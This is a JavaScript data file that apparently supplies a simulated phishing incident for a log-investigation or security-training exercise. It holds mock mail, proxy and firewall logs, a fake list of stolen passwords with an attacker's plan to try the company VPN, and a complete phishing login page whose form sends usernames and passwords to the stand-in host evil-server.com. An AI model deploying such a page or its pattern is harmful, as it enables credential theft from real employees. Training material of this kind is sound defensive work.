// This file is for reference - actual log content will be in your log viewer components

export const smtpLog = `TIMESTAMP         | EVENT      | FROM                       | TO
2024-03-15 08:15  | DELIVERED  | external@evil.com          | ALL
2024-03-15 08:16  | DELIVERED  | newsletter@company.com     | sarah
2024-03-15 08:22  | DELIVERED  | client@biz.com             | mike
2024-03-15 09:30  | DELIVERED  | hr@company.com             | all-staff
2024-03-15 10:15  | DELIVERED  | sales@partner.com          | mike
2024-03-15 11:00  | DELIVERED  | it-support@company.com     | lisa
2024-03-15 14:32  | DELIVERED  | IT-Support@company-reset.com | sarah
2024-03-15 14:32  | DELIVERED  | IT-Support@company-reset.com | mike
2024-03-15 14:32  | DELIVERED  | IT-Support@company-reset.com | lisa
2024-03-15 14:32  | DELIVERED  | IT-Support@company-reset.com | 12 more employees
2024-03-15 14:33  | SPAM_FLAG  | IT-Support@company-reset.com | -`;

export const proxyLog = `TIMESTAMP         | USER   | URL
2024-03-15 08:30  | sarah  | company.com/hr
2024-03-15 08:45  | mike   | company.com/sales
2024-03-15 09:12  | lisa   | company.com/finance
2024-03-15 10:30  | sarah  | company.com/benefits
2024-03-15 11:15  | mike   | google.com/search
2024-03-15 13:45  | lisa   | company.com/reports
2024-03-15 14:35  | sarah  | company-reset.com/login
2024-03-15 14:36  | mike   | company-reset.com/login
2024-03-15 14:38  | lisa   | company-reset.com/login
2024-03-15 14:40  | sarah  | company-reset.com/submit
2024-03-15 14:42  | mike   | company-reset.com/submit
2024-03-15 14:45  | lisa   | company-reset.com/submit
2024-03-15 15:30  | sarah  | company.com/hr`;

export const firewallLog = `TIMESTAMP         | EVENT        | USER   | SOURCE IP
2024-03-15 08:00  | VPN_CONNECT  | sarah  | 10.0.0.45
2024-03-15 08:15  | VPN_CONNECT  | mike   | 10.0.0.67
2024-03-15 08:30  | VPN_CONNECT  | lisa   | 10.0.0.89
2024-03-15 09:00  | VPN_CONNECT  | sarah  | 10.0.0.45
2024-03-15 10:30  | VPN_CONNECT  | mike   | 10.0.0.67
2024-03-15 12:00  | VPN_CONNECT  | lisa   | 10.0.0.89
2024-03-15 23:15  | VPN_ATTEMPT  | sarah  | 185.142.53.89
2024-03-15 23:16  | VPN_FAILED   | sarah  | 185.142.53.89
2024-03-15 23:18  | VPN_ATTEMPT  | lisa   | 185.142.53.89
2024-03-15 23:19  | VPN_FAILED   | lisa   | 185.142.53.89
2024-03-15 23:22  | VPN_ATTEMPT  | mike   | 185.142.53.89
2024-03-15 23:23  | VPN_FAILED   | mike   | 185.142.53.89`;

export const credentialsTxt = `[SIMULATED DATA - CAPTURED BY ATTACKER]

TIMESTAMP: 2024-03-15 14:40:22
──────────────────────────────────
Username: sarah@company.com
Password: Summer2024!
──────────────────────────────────

TIMESTAMP: 2024-03-15 14:42:35
──────────────────────────────────
Username: mike@company.com
Password: sales123
──────────────────────────────────

TIMESTAMP: 2024-03-15 14:45:17
──────────────────────────────────
Username: lisa@company.com
Password: finance2024
──────────────────────────────────

[ATTACKER NOTE]
"HR account has access to employee records.
 Sales account is low value.
 Finance account has payment systems.
 Will try these on company VPN tonight."`;

export const phishingPageHtml = `<!DOCTYPE html>
<html>
<head>
  <title>Company Email Login</title>
  <style>
    body { font-family: Arial; background: #f0f0f0; }
    .container { max-width: 400px; margin: 100px auto; background: white; padding: 30px; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
    h2 { color: #333; }
    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px; }
    button { width: 100%; padding: 10px; background: #0078d4; color: white; border: none; border-radius: 3px; cursor: pointer; }
    .note { font-size: 12px; color: #666; margin-top: 20px; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Company Email Login</h2>
    <p>Your password will expire in 24 hours. Login to keep your current password.</p>
    <form action="http://evil-server.com/steal.php" method="POST">
      <input type="email" name="username" placeholder="Email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">LOGIN TO KEEP PASSWORD</button>
    </form>
    <div class="note">IT Security Department</div>
  </div>
</body>
</html>`;